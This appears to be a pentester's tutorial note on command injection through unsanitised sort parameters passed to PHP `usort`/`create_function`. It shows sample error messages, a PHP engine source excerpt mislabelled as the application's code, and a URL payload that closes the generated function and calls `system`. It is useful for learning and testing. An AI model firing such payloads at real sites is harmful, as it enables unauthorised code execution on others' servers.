---
tags: php
---

## usort
There are two main ways developers order information:
- with `order by` in SQL
- or with `usort` in PHP

If this is not sanitized well, it can lead to code execution.

To try to find this mistake, we can input a “`'`”

An example error message might look something like this:

```
**Parse error**: syntax error, unexpected '',$b->'' (T_CONSTANT_ENCAPSED_STRING), expecting identifier (T_STRING) or variable (T_VARIABLE) or '{' or '$' in **/var/www/index.php(29) : runtime-created function** on line **1**

  
**Warning**: usort() expects parameter 2 to be a valid callback, no array or string given in **/var/www/index.php** on line **29**
```

This is what the example source code that produces this error looks like:

```php
ZEND_FUNCTION(create_function)
	{
	  [...]
	  eval_code = (char *) emalloc(eval_code_length);
	  sprintf(eval_code, "function " LAMBDA_TEMP_FUNCNAME "(%s){%s}", Z_STRVAL_PP(z_function_args), Z_STRVAL_PP(z_function_code));
	 
	  eval_name = zend_make_compiled_string_description("runtime-created function" TSRMLS_CC);
	  retval = zend_eval_string(eval_code, NULL, eval_name TSRMLS_CC);
	  [...]
```

#TODO review this

We can see that the evaluated data is put inside curly brackets, meaning we will have to use that too (`{...}`). 

A possible payload might look like this: `?order=id);}system('uname -a');//`

Where you should increase the number of brackets(`)`) until you don’t get errors. An error might look something like this: `Parse error: syntax error, unexpected ';'`

For more info on something like this: `CVE-2008-4096`